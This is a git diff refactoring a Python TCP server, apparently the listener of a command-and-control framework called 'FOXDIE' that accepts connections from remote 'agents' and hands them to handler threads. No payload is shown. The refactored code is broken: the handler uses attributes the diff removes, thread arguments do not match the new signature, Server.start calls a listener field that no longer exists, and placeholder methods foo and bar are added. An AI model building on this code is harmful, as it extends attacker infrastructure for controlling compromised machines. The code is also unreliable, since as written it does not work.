@@ -2,18 +2,15 @@ from dataclasses import dataclass, field
 from ipaddress import IPv4Address
 from socket import AF_INET, SOCK_STREAM, socket
 from threading import Thread, Event
-from typing import Any
+from typing import Dict
 from time import sleep, time
 
 @dataclass
 class Handler:
-    killswitch: Event = field(default = None)
-    agent_socket: socket = field(default = None)
-    agent_port: int = field(default = None)
-    def __post_init__(self):
+    def start(self, agent_socket: socket, agent_port: int, killswitch: Event):
         print(f"[FOXDIE: {self.agent_port}] connected")
         ONE_MINUTE = time() + 60
-        while not self.killswitch.is_set():
+        while not killswitch.is_set():
             try:
                 if time() > ONE_MINUTE: break
                 agent_request = self.agent_socket.recv(1024).decode()
@@ -27,19 +24,21 @@ class Handler:
 
 @dataclass
 class Listener:
-    server: Any = field(default = None)
-    killswitch: Event = field(default = None)
-    ip: IPv4Address = field(default = None)
-    port: int = field(default = None)
-    handler: Handler = field(default = None)
+    ip: IPv4Address
+    port: int 
 
-    def __post_init__(self):
-        if self.server:
-            self.killswitch = self.server.killswitch
-        elif self.killswitch == None:
-            self.killswitch = Event()
+    def __key(self):
+        return (self.ip, self.port)
 
-    def start(self):
+    def __hash__(self):
+        return hash(self.__key())
+        
+    def __eq__(self, other):
+        if isinstance(other, Listener):
+            return self.__key() == other.__key()
+        return NotImplemented
+
+    def start(self, handler: Handler, killswitch: Event):
         self.address = (str(self.ip), self.port)
         self.socket = socket(AF_INET, SOCK_STREAM)
         self.socket.bind(self.address)
@@ -52,7 +51,7 @@ class Listener:
                 agent_port = agent_address[1]
                 thread = Thread(
                     name = agent_port,
-                    target = self.handler,
+                    target = handler.start,
                     args = [self.killswitch, agent_socket, agent_port]
                 )
                 thread.start()
@@ -62,14 +61,26 @@ class Listener:
 
 @dataclass
 class Server:
-    killswitch: Event = field(default = None)
-    listener: Listener = field(default = None)
+    workers: Dict[Listener, Handler]
+    killswitch: Event = field(default_factory = Event)
+
+    def foo(self):
+        for foo in self.workers.items():
+            print(dir(foo))
+
+    def bar(self):
+        print(self.workers[Listener(ip = "127.0.0.1", port = 80)])
+        
     def start(self):
         try:
-            c2 = Thread(target = self.listener.start)
-            c2.start()
+            thread = Thread(
+                target = self.listener.start,
+                args = [self.killswitch]
+            )
+            thread.start()
             while not self.killswitch.is_set(): 
                 sleep(0.5)
         except KeyboardInterrupt: 
             self.killswitch.set()
-            c2.join()
+            thread.join()
+
